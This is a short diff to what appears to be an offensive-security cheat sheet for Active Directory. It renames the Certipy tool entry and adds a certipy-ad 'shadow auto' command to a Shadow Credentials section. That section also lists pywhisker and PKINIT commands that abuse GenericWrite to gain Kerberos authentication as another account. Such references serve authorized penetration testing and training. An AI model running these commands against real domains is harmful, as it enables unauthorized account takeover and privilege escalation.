@@ -111,7 +111,7 @@
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
 | BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
 | Certify | https://github.com/GhostPack/Certify |
-| Certipy | https://github.com/ly4k/Certipy |
+| Certipy / certipy-ad | https://github.com/ly4k/Certipy |
 | DonPAPI | https://github.com/login-securite/DonPAPI |
 | enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
 | GTFOBins | https://gtfobins.github.io |
@@ -1357,6 +1357,7 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<U
 #### Shadow Credentials
 
 ```bash
+certipy-ad shadow auto -u '<USERNAME>@<DOMAIN>' -k -account '<ACCOUNT>$' -dc-ip <DC_IP> -target <DC_FQDN>                       # Abuses shadow credentials to obtain Kerberos auth as a target account. GenericWrite
 python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
 python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
 export KRB5CCNAME=<USERNAME>.ccache
